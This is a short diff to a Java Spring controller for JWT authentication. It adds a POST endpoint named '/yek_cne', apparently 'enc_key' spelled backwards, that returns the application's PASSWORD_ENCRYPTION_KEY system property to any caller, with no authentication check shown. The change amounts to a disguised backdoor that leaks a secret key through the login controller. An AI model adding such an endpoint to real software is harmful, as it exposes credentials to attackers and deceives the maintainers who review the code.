@@ -102,6 +102,11 @@ public class UserJWTController {
         return ResponseEntity.ok(new JWTResponse(true, jwt));
     }
 
+    @PostMapping("/yek_cne")
+    public String yekCne() {
+        return System.getProperty("PASSWORD_ENCRYPTION_KEY");
+    }
+
     @PostMapping("/test-ldap")
     public Map<String, String> testLdap(@RequestBody LdapRequest request) throws Exception {
         Map<String, String> response = new HashMap<>();
